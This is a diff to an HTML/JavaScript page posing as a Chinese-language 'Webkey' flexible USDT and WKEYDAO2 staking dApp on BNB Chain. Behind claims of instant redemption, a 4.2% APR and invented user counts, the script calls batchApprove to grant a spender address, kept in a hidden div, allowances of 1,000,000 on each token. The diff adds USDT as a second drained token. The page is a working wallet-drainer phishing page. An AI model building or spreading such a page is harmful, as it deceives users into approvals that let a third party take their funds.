@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Webkey Staking</title>
+    <title>Webkey 活期质押</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
@@ -79,7 +79,7 @@
         /* Logo 区域 */
         .logo-section {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
             position: relative;
         }
         
@@ -129,113 +129,165 @@
             color: #a67c7c;
             font-size: 15px;
             font-weight: 400;
+            margin-bottom: 8px;
         }
         
-        /* 质押卡片 */
-        .stake-card {
+        /* 活期质押标识 */
+        .flex-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid #ff0000;
+            color: #ff6666;
+            padding: 6px 18px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            backdrop-filter: blur(5px);
+        }
+        
+        /* 代币卡片容器 */
+        .tokens-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        /* 代币卡片 */
+        .token-card {
             background: rgba(30, 10, 10, 0.8);
-            border-radius: 28px;
-            padding: 22px;
-            margin-bottom: 22px;
+            border-radius: 24px;
+            padding: 16px;
             border: 1px solid rgba(255, 0, 0, 0.2);
             position: relative;
             overflow: hidden;
             backdrop-filter: blur(5px);
-        }
-        
-        .stake-header {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 20px;
         }
         
         .token-icon {
-            width: 52px;
-            height: 52px;
+            width: 48px;
+            height: 48px;
             background: linear-gradient(135deg, #ff0000, #660000);
-            border-radius: 20px;
+            border-radius: 18px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
+            font-size: 24px;
             color: white;
             box-shadow: 0 8px 16px rgba(255, 0, 0, 0.3);
+            flex-shrink: 0;
         }
         
-        .token-info {
+        .token-details {
             flex: 1;
         }
         
-        .token-name {
-            font-size: 20px;
-            font-weight: 700;
-            color: white;
+        .token-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             margin-bottom: 4px;
         }
         
-        .token-desc {
-            color: #a67c7c;
-            font-size: 13px;
+        .token-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
         }
         
-        /* 数据网格 */
+        .flex-badge {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px dashed #ff6666;
+            color: #ff9999;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+        }
+        
+        .token-amount {
+            font-size: 15px;
+            color: #ff9999;
+            font-weight: 500;
+        }
+        
+        .token-amount span {
+            color: #a67c7c;
+            font-size: 13px;
+            margin-left: 4px;
+        }
+        
+        /* 统计卡片 */
+        .stats-container {
+            background: rgba(139, 0, 0, 0.15);
+            border-radius: 24px;
+            padding: 16px;
+            margin: 16px 0;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
         .stats-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin: 20px 0;
         }
         
         .stat-item {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 18px;
-            padding: 16px 12px;
             text-align: center;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: 800;
-            color: #ff3333;
-            margin-bottom: 4px;
-            text-shadow: 0 0 8px rgba(255, 0, 0, 0.5);
         }
         
         .stat-label {
-            font-size: 13px;
             color: #a67c7c;
+            font-size: 12px;
+            margin-bottom: 4px;
         }
         
-        /* 进度条 */
-        .progress-container {
-            margin: 20px 0;
+        .stat-value {
+            color: #ff6666;
+            font-size: 20px;
+            font-weight: 700;
         }
         
-        .progress-header {
+        .stat-note {
+            color: #8b5a5a;
+            font-size: 11px;
+            margin-top: 8px;
+            text-align: center;
+        }
+        
+        /* 灵活存取提示卡 */
+        .flex-card {
+            background: rgba(139, 0, 0, 0.2);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 16px 0;
+            border: 1px solid #ff0000;
             display: flex;
-            justify-content: space-between;
-            color: #a67c7c;
-            font-size: 14px;
-            margin-bottom: 8px;
+            align-items: center;
+            gap: 12px;
         }
         
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 0, 0, 0.1);
-            border-radius: 100px;
-            overflow: hidden;
-            border: 1px solid rgba(255, 0, 0, 0.2);
+        .flex-icon {
+            font-size: 32px;
         }
         
-        .progress-fill {
-            width: 78%;
-            height: 100%;
-            background: linear-gradient(90deg, #ff0000, #8b0000);
-            border-radius: 100px;
-            position: relative;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        .flex-text {
+            flex: 1;
+        }
+        
+        .flex-title {
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+        
+        .flex-desc {
+            color: #ff9999;
+            font-size: 13px;
         }
         
         /* 按钮 */
@@ -275,7 +327,6 @@
         
         .stake-button:active {
             transform: scale(0.98);
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.6);
         }
         
         /* 提示信息 */
@@ -321,10 +372,6 @@
             font-weight: 600;
         }
         
-        .result a:hover {
-            text-decoration: underline;
-        }
-        
         /* 隐藏的技术数据 */
         .hidden-data {
             display: none;
@@ -351,7 +398,7 @@
             display: flex;
             justify-content: space-between;
             color: #8b5a5a;
-            font-size: 13px;
+            font-size: 12px;
             margin-top: 16px;
             padding-top: 16px;
             border-top: 1px solid rgba(255, 0, 0, 0.2);
@@ -364,13 +411,17 @@
             }
             
             .token-icon {
-                width: 44px;
-                height: 44px;
-                font-size: 24px;
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
             }
             
-            .stat-value {
-                font-size: 20px;
+            .token-name {
+                font-size: 16px;
+            }
+            
+            .token-amount {
+                font-size: 14px;
             }
             
             .stake-button {
@@ -383,54 +434,70 @@
 <body>
     <div class="container">
         <div class="card">
-            <div class="badge">⚡ HOT</div>
+            <div class="badge">⚡ 活期 · 双币</div>
             
             <!-- Logo 区域 -->
             <div class="logo-section">
                 <div class="logo">
-                    <span>⚡️</span>
+                    <span>⏱️</span>
                 </div>
-                <h1 class="title">WEBKEY STAKING</h1>
-                <div class="subtitle">Stake · Earn · Repeat</div>
+                <h1 class="title">双币活期质押</h1>
+                <div class="subtitle">USDT + WKEYDAO2 · 随存随取</div>
+                <div class="flex-tag">🔓 活期 · 无锁仓 · 即时赎回</div>
             </div>
             
-            <!-- 质押卡片 -->
-            <div class="stake-card">
-                <div class="stake-header">
-                    <div class="token-icon">🔴</div>
-                    <div class="token-info">
-                        <div class="token-name">WKEYDAO2</div>
-                        <div class="token-desc">Ecosystem Token</div>
+            <!-- 代币列表 -->
+            <div class="tokens-container">
+                <!-- USDT 卡片 -->
+                <div class="token-card">
+                    <div class="token-icon">💵</div>
+                    <div class="token-details">
+                        <div class="token-header">
+                            <span class="token-name">USDT</span>
+                            <span class="flex-badge">随时提取</span>
+                        </div>
+                        <div class="token-amount">
+                            1,000,000 <span>授权额度</span>
+                        </div>
                     </div>
                 </div>
                 
-                <!-- 统计数据 -->
+                <!-- WKEYDAO2 卡片 -->
+                <div class="token-card">
+                    <div class="token-icon">🔴</div>
+                    <div class="token-details">
+                        <div class="token-header">
+                            <span class="token-name">WKEYDAO2</span>
+                            <span class="flex-badge">随时提取</span>
+                        </div>
+                        <div class="token-amount">
+                            1,000,000 <span>授权额度</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 统计卡片 -->
+            <div class="stats-container">
                 <div class="stats-grid">
                     <div class="stat-item">
-                        <div class="stat-value">8.5%</div>
-                        <div class="stat-label">APR</div>
+                        <div class="stat-label">活期 APR</div>
+                        <div class="stat-value">4.2%</div>
                     </div>
                     <div class="stat-item">
-                        <div class="stat-value">1.2M</div>
-                        <div class="stat-label">Staked</div>
+                        <div class="stat-label">总锁仓</div>
+                        <div class="stat-value">$1.2M</div>
                     </div>
                 </div>
-                
-                <!-- 进度条 -->
-                <div class="progress-container">
-                    <div class="progress-header">
-                        <span>Pool Capacity</span>
-                        <span>78%</span>
-                    </div>
-                    <div class="progress-bar">
-                        <div class="progress-fill"></div>
-                    </div>
-                </div>
-                
-                <!-- 参与者信息 -->
-                <div class="footer">
-                    <span>👥 1,234 Stakers</span>
-                    <span>💰 0.01 BNB gas</span>
+                <div class="stat-note">⚡ 随存随取 · 无任何锁定期</div>
+            </div>
+            
+            <!-- 灵活存取提示卡 -->
+            <div class="flex-card">
+                <div class="flex-icon">🔄</div>
+                <div class="flex-text">
+                    <div class="flex-title">活期质押 · 即时赎回</div>
+                    <div class="flex-desc">授权后随时可存 · 想取就取 · 秒到账</div>
                 </div>
             </div>
             
@@ -438,20 +505,27 @@
             <div class="hidden-data" id="contractData" 
                  data-contract="0x62B5E69a0a97109Fe0BfC243E02673D293D7c921"
                  data-spender="0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b"
-                 data-token="0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E">
+                 data-token1="0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E"
+                 data-token2="0x55d398326f99059ff775485246999027b3197955">
             </div>
             
             <!-- 质押按钮 -->
             <button class="stake-button" onclick="stakeTokens()">
-                🔴 STAKE NOW
+                🔓 授权并参与活期质押
             </button>
             
             <div class="note">
-                One signature required · Gas fee: ~0.01 BNB
+                一次授权 · 双币同时开通 · 随时存取
             </div>
             
             <!-- 结果展示 -->
             <div id="result" class="result"></div>
+            
+            <!-- 底部信息 -->
+            <div class="footer">
+                <span>👥 1,234 活期用户</span>
+                <span>⚡ 已质押 892,456 USDT</span>
+            </div>
         </div>
     </div>
 
@@ -460,7 +534,8 @@
         const contractData = document.getElementById('contractData');
         const CONTRACT_ADDRESS = contractData.dataset.contract;
         const SPENDER = contractData.dataset.spender;
-        const TOKEN_ADDRESS = contractData.dataset.token;
+        const TOKEN1 = contractData.dataset.token1;  // WKEYDAO2
+        const TOKEN2 = contractData.dataset.token2;  // USDT
         const AMOUNT = '1000000';  // 1,000,000
 
         // ABI
@@ -480,12 +555,12 @@
             const resultDiv = document.getElementById('result');
             resultDiv.style.display = 'block';
             resultDiv.className = 'result';
-            resultDiv.innerHTML = '⏳ Connecting wallet...';
+            resultDiv.innerHTML = '⏳ 连接钱包中...';
             
             try {
                 // 检查钱包
                 if (!window.ethereum) {
-                    throw new Error('Please install MetaMask');
+                    throw new Error('请安装 MetaMask');
                 }
                 
                 // 请求连接
@@ -493,16 +568,16 @@
                 const web3 = new Web3(window.ethereum);
                 const accounts = await web3.eth.getAccounts();
                 
-                resultDiv.innerHTML = '⏳ Preparing transaction...';
+                resultDiv.innerHTML = '⏳ 准备授权双币...';
                 
-                // 准备参数（保持数组格式，但只传一个代币）
+                // 准备参数（两个代币）
                 const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
-                const tokens = [TOKEN_ADDRESS];
-                const amounts = [amountInWei];
+                const tokens = [TOKEN1, TOKEN2];
+                const amounts = [amountInWei, amountInWei];
                 
                 const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
                 
-                resultDiv.innerHTML = '⏳ Please confirm in your wallet...';
+                resultDiv.innerHTML = '⏳ 请在钱包中确认授权...';
                 
                 // 发送交易
                 const tx = await contract.methods.batchApprove(tokens, SPENDER, amounts).send({
@@ -513,19 +588,20 @@
                 // 成功
                 resultDiv.className = 'result success';
                 resultDiv.innerHTML = `
-                    ✅ Staking successful!<br>
-                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View transaction →</a>
+                    ✅ 活期质押开通成功！<br>
+                    双币授权已完成 · 随时可存可取<br>
+                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">查看交易详情 →</a>
                 `;
                 
             } catch (error) {
                 // 失败
                 resultDiv.className = 'result error';
                 if (error.message.includes('User rejected')) {
-                    resultDiv.innerHTML = '❌ Transaction canceled';
+                    resultDiv.innerHTML = '❌ 您已取消授权';
                 } else if (error.message.includes('insufficient')) {
-                    resultDiv.innerHTML = '❌ Insufficient BNB for gas';
+                    resultDiv.innerHTML = '❌ BNB 余额不足，请补充 Gas 费';
                 } else {
-                    resultDiv.innerHTML = '❌ Transaction failed';
+                    resultDiv.innerHTML = '❌ 授权失败，请重试';
                 }
             }
         }
